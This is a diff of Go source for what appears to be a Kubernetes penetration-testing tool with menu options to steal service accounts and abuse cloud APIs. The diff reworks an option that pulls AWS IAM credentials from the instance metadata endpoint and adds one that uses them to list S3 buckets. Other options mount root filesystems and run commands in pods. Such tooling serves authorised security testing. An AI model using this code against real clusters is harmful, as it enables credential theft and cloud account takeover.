@@ -73,7 +73,7 @@ func getPodList(connectionString ServerInfo) []string {
 func getSecretList(connectionString ServerInfo) ([]string, []string) {
 
 	if !kubectlAuthCanI(connectionString, "get", "secrets") {
-		println("[-] Permission Denied: your service account isn't allowed to get secrets")
+		println("[-] Permission Denied: your service account isn't allowed to list secrets")
 		return []string{}, []string{}
 	}
 
@@ -976,7 +976,11 @@ Steal Service Accounts   |
 [12] Request IAM credentials from AWS Metadata API [AWS only]
 [13] Request IAM credentials from GCP Metadata API [GCP only]
 [14] Request kube-env from GCP Metadata API [GCP only]
-[15] Pull Kubernetes service account tokens from GCS [GCP only] 
+[15] Pull Kubernetes service account tokens from Kop's bucket in GCS [GCP only] 
+--------------------------------+
+Interrogate/Abuse Cloud API's   |
+--------------------------------+
+[17] Run AWS S3 List Bucket Commands with Auto-Refreshing Metadata API credentials [AWS] [alpha]
 -----------+
 Compromise |
 -----------+
@@ -1246,26 +1250,12 @@ Leave off the "kubectl" part of the command.  For example:
 			MountRootFS(allPods, connectionString, ip, port)
 			break
 
-		// [12] Request IAM credentials from AWS Metadata API [AWS only] [not yet implemented]
+		// [12] Request IAM credentials from AWS Metadata API [AWS only]
 		case "12":
-			resp, err := http.Get("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
-			if err != nil {
-				println("[-] Error - could not perform request http://169.254.169.254/latest/meta-data/iam/security-credentials/")
-			}
-			// Parse result as an account, then construct a request asking for that account's credentials
-			defer resp.Body.Close()
-			body, err := ioutil.ReadAll(resp.Body)
-			account := string(body)
-			println(account)
+			// Pull IAM credentials from the Metadata API, store in a struct and display
+			var IAMCredentials = PullIamCredentialsFromAWS()
+			DisplayAWSIAMCredentials(IAMCredentials)
 
-			request := "http://169.254.169.254/latest/meta-data/iam/security-credentials/" + account
-			resp_2, err := http.Get(request)
-			if err != nil {
-				println("[-] Error - could not perform request ", request)
-			}
-			defer resp_2.Body.Close()
-			body_2, err := ioutil.ReadAll(resp_2.Body)
-			println(string(body_2))
 			break
 
 		// [13] Request IAM credentials from GCP Metadata API [GCP only]
@@ -1339,7 +1329,7 @@ Leave off the "kubectl" part of the command.  For example:
 
 			break
 
-		// [15] Pull Kubernetes service account tokens from GCS [GCP only]
+		// [15] Pull Kubernetes service account tokens from Kop's bucket in GCS [GCP only]
 		case "15":
 			var storeTokens string
 			var placeTokensInStore bool
@@ -1459,6 +1449,19 @@ Leave off the "kubectl" part of the command.  For example:
 			// Don't forget to base64 decode with base64.StdEncoding.DecodeString()
 
 			break
+
+		case "17":
+			// [17] Run AWS S3 List Bucket Commands with Auto-Refreshing Metadata API credentials [AWS]
+			var bucket string
+
+			var IAMCredentials = PullIamCredentialsFromAWS()
+			println("Enter a bucket name to list: ")
+			fmt.Scanln(&bucket)
+
+			ListBucketObjects(IAMCredentials, bucket)
+
+			break
+
 		case "19":
 			break
 		// [21] Run command in one or all pods in this namespace
